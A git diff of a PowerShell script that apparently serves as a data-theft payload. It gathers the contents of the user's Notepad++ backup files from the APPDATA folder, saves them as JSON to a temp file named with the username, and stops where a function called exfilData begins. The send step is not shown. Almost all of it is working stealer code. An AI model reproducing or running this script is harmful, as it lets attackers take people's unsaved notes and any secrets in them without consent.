@@ -1,17 +1,25 @@
 $FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"
+
 $appdataroaming = $ENV:APPDATA
 $toread = "Notepad++\backup"
 $fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
 $filelist = Get-ChildItem $fullpath\*@*
-$backupcontents = ForEach ($filepath in $filelist)
+
+function Get-backupContents{
+    $backupcontents = ForEach ($filepath in $filelist)
     {
         $filecontent = Get-Content -Path $filepath
         [pscustomobject]@{
             'FileContent:' = $filecontent
         }
     }
+    return $backupContents
+}
+$backupContents = Get-backupContents
 $out = ConvertTo-Json $backupcontents
 $out > $FileName 
+
+
 function exfilData {
     [CmdletBinding()]
     param (
